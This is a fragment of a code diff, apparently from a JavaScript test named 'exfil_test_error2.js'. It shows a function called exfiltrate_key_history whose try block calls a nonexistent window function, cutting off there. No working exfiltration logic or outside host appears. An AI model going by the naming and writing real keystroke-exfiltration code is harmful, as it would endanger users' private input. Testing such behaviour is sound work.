@@ -1,3 +1,4 @@
+// exfil_test_error2.js
 function exfiltrate_key_history() {
   try {
     window.NotExistingFunction()
